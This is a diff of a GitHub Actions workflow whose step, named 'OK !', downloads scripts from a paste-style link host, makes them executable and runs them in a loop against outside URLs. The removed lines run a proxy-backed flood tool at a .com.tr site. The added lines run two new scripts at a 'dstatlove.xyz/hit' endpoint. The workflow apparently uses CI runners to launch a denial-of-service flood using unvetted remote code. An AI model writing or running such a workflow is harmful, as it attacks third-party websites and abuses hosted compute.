@@ -15,13 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/IWejc/pro.js
-          wget https://curl.by/HStFe/proxies.txt
-          npm i hpack
-          chmod +x pro.js
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/XW2WO/Test.py
+          wget https://curl.by/ripPh/testraw.js
+          chmod +x testraw.js
+          chmod +x Test.py
           PIDS=()
           for i in {1..5}; do
-            timeout 90 node pro.js GET https://lapexnw.com.tr/ 90 24 90 proxies.txt --full
+            timeout 90 python3 Test.py https://dstatlove.xyz/hit && node testraw.js https://dstatlove.xyz/hit 80
             PIDS+=($!)
           done
           
